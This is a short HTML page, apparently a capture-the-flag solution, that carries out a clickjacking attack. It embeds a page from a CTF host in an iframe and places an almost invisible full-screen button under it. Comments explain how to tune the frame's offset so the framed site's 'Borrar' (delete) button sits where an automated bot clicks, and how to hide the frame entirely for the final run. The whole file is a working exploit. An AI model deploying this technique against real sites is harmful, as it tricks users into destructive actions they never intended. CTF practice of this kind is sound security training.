<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Clickjacking</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; }

        /* El botón que el bot busca (ID OBJETIVO) */
        /* Lo hacemos gigante: ocupe TODA la pantalla */
        #objetivo {
            position: absolute;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: 1; /* Estará al fondo */
            opacity: 0.001;
        }

        /* El IFRAME de la librería */
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 1000px;
            border: none;
            z-index: 2; /* Estará ARRIBA del botón */
            /* Calibra el margin-top para que el botón 'Borrar' de la web 
               real quede donde el bot suele hacer clic (el centro de la pantalla) */
            margin-top: -720px; 
            opacity: 0.5; /* Ponlo en 0 para el bot final */
        }
    </style>
</head>
<body>

    <button id="objetivo">CLICK</button>

    <iframe src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>

</body>
</html>
